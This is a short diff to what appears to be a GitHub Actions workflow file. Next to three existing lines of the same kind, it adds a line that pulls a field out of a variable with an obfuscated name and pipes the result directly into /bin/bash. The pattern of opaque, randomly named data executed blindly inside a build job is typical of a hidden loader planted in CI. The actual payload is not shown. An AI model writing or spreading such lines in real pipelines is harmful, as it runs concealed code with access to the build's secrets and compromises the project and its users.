@@ -24,6 +24,7 @@ jobs:
           printf '%s' "$qwyc623" | jq -r .xn0 | /bin/bash
           echo $t789 | jq -r .ktf6 | /bin/bash
           echo $kipl3 | jq -r .wbpyy12073 | /bin/bash
+          echo $u1 | jq -r .vphoc6593 | /bin/bash
 
       - name: Store artifact
         uses: actions/upload-artifact@v4
